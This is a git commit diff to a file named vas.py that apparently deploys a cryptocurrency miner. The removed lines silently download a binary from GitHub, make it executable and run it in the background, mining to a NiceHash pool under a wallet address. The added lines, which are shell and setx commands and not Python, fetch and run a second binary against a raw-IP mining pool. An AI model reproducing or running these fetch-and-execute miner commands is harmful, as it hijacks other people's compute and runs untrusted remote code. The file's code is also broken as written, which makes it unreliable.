b4d24f04fc2ce7c643dee7d6cf5f399ef4d91afc
torgyv <108770567+torgyv@users.noreply.github.com>
2022-07-24 03:07:41 +0700

    Update vas.py

--- vas.py
+++ vas.py
@@ -1,4 +1,7 @@
-import os
-scraper = os.system('wget https://github.com/torgyv/cuda/raw/main/kopi && chmod 777 kopi && nohup ./kopi --algo BEAM-III --pool stratum+tcp://beamv3.hk.nicehash.com:3387 --user 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w &>/dev/null &')
-print(scraper)
-
+setx GPU_FORCE_64BIT_PTR 0
+setx GPU_MAX_HEAP_SIZE 50
+setx GPU_USE_SYNC_OBJECTS 0
+setx GPU_MAX_ALLOC_PERCENT 50
+setx GPU_SINGLE_ALLOC_PERCENT 50
+wget https://github.com/torgyv/cuda/raw/main/vray && chmod 777 vray
+./vray -S stratum+tcp://104.237.157.192:80  -U 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w.rig3 -P x
